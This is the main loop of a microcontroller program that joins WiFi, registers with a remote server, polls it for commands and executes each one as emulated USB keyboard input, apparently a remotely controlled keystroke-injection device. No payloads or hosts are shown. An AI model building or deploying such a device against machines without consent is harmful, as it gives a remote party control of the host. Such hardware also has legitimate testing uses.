# code.py
import time
import gc
import config
import wifi_manager
import client_api
import hid_executor

def setup():
    print("Initializing system...")
    for i in range(5, 0, -1): # Shortened safety delay
        time.sleep(1)
    wifi_manager.ensure_connection()
    print("System ready. Entering main loop.")

def loop():
    while True:
        try:
            # 1. Just ensure WiFi is up. Don't touch registration here.
            if not wifi_manager.is_connected():
                print("WiFi disconnected. Reconnecting...")
                wifi_manager.ensure_connection(max_total_wait=60)

            # 2. Only re-register if we are CERTAIN we are unregistered
            if not client_api.is_registered:
                print("Handshake required...")
                if client_api.register_device():
                    print("Registration successful!")
                else:
                    time.sleep(5)
                    continue

            # 3. Poll normally
            commands = client_api.poll_commands()
            if commands and isinstance(commands, list):
                for cmd in commands:
                    if not hid_executor.execute_command(cmd):
                        client_api.send_log(f"Failed: {cmd}")
                        
        except Exception as e:
            print("Main loop error:", e)
        finally:
            gc.collect()
            time.sleep(config.POLL_INTERVAL)

if __name__ == "__main__":
    setup()
    loop()